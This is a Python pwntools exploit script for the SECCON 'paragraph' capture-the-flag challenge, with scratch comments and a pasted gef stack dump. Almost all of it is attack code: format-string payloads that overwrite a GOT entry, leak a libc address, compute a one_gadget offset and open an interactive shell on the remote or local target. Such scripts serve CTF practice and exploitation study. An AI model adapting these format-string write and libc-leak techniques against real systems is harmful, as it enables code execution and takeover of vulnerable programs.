from pwn import *
elf_file = FILENAME = './chall'
elf = context.binary = ELF(elf_file)
context.log_level = 'debug' # output verbose log



HOST = b'paragraph.seccon.games'
POST = 5000
libc = ELF(b"./libc.so.6")
'''
HOST = b"localhost"
POST = 5000
libc = ELF(b"./libc.so.6")
#libc = ELF(b"./libc6-amd64_2.27-3ubuntu1_i386/data/lib64/libc.so.6")
'''
if len(sys.argv) > 1 and sys.argv[1] == 'r':
  num = 6
  c = remote(HOST, POST)
else:
  num = 6
  c = gdb.debug(FILENAME,gdbscript='''
        b *main+0x53
        ''')

# %6 $rsp

# %13 
#libc 0x25f90
#one_gadget 0x1111aa 

#local %11 libc_start_main

'''
(remote) gef➤  tel
0x00007ffda92bf180│+0x0000: "%4198576c%8$llna(@@"	 ← $rsp, $rdi
0x00007ffda92bf188│+0x0008: "c%8$llna(@@"
0x00007ffda92bf190│+0x0010: 0x0000000000404028  →  0x0000000000401050  →  0x00000268fa1e0ff3
0x00007ffda92bf198│+0x0018: 0x00007ffda92bf2c8  →  0x00007ffda92c02cd  →  0x006c6c6168632f2e ("./chall"?)
0x00007ffda92bf1a0│+0x0020: 0x00007ffda92bf240  →  0x00007ffda92bf2a0  →  0x0000000000000000	 ← $rbp
0x00007ffda92bf1a8│+0x0028: 0x000077e90be2a1ca  →   mov edi, eax
0x00007ffda92bf1b0│+0x0030: 0x00007ffda92bf1f0  →  0x0000000000000000
0x00007ffda92bf1b8│+0x0038: 0x00007ffda92bf2c8  →  0x00007ffda92c02cd  →  0x006c6c6168632f2e ("./chall"?)
0x00007ffda92bf1c0│+0x0040: 0x00000001003fe040
0x00007ffda92bf1c8│+0x0048: 0x0000000000401196  →  <main+0000> endbr64 
(remote) gef➤  
0x00007ffda92bf1d0│+0x0050: 0x00007ffda92bf2c8  →  0x00007ffda92c02cd  →  0x006c6c6168632f2e ("./chall"?)
0x00007ffda92bf1d8│+0x0058: 0xf707447178d45cce
0x00007ffda92bf1e0│+0x0060: 0x0000000000000001
0x00007ffda92bf1e8│+0x0068: 0x0000000000000000
0x00007ffda92bf1f0│+0x0070: 0x0000000000000000
0x00007ffda92bf1f8│+0x0078: 0x000077e90c1a5000  →  0x000077e90c1a62e0  →  0x0000000000000000
0x00007ffda92bf200│+0x0080: 0xf70744717f345cce
0x00007ffda92bf208│+0x0088: 0xe72e01e3df565cce
0x00007ffda92bf210│+0x0090: 0x00007ffd00000000
0x00007ffda92bf218│+0x0098: 0x0000000000000000
(remote) gef➤  
0x00007ffda92bf220│+0x00a0: 0x0000000000000000
0x00007ffda92bf228│+0x00a8: 0x0000000000000001
0x00007ffda92bf230│+0x00b0: 0x0000000000000000
0x00007ffda92bf238│+0x00b8: 0xfdac77eecc4a3500
0x00007ffda92bf240│+0x00c0: 0x00007ffda92bf2a0  →  0x0000000000000000
0x00007ffda92bf248│+0x00c8: 0x000077e90be2a28b  →  <__libc_start_main+008b> mov r15, QWORD PTR [rip+0x1d8cf6]        # 0x77e90c002f88
0x00007ffda92bf250│+0x00d0: 0x00007ffda92bf2d8  →  0x00007ffda92c02d5  →  "SHELL=/bin/bash"
0x00007ffda92bf258│+0x00d8: 0x000077e90c1a62e0  →  0x0000000000000000
0x00007ffda92bf260│+0x00e0: 0x00007ffd00000000
0x00007ffda92bf268│+0x00e8: 0x0000000000401196  →  <main+0000> endbr64 

'''

# %31
# payload = fmtstr_payload(num,{0x404028:0x4010b0},write_size='int')
libc_main = 0xe6f1f
#504
payload = b"%488c%96c%33$n"


payload2 = b"%488c%33$n%4014c%6$hhn\x00\x40\x40\x00\x00\x00\x00\x00"

payload3 = b'%*15$c%8$n%33$hn'  +p64(0x404fae)

payload4 = b'%*38$p%8$n%33$hn' +p64(0x404ec8)
c.sendafter("asked.",payload4)

c.recvuntil("0x")
leak = c.recvuntil(b"\xc8").rstrip(b"\xc8")
leak = int(leak,16)

print(hex(leak))

libc.address = leak - 0x18a8c0
one_gadget = libc.address + 0x1111aa
pay_add = one_gadget - libc.sym["__libc_start_main"] - 0x8b - 8 - 0x401196
print(hex(pay_add))
payload5 = p64(0x404028) + f'%*31$c%{pay_add}c%6$n'.encode()
print(payload5)
#c.sendafter("asked.",payload5)

c.interactive()
#gdb.attach(r)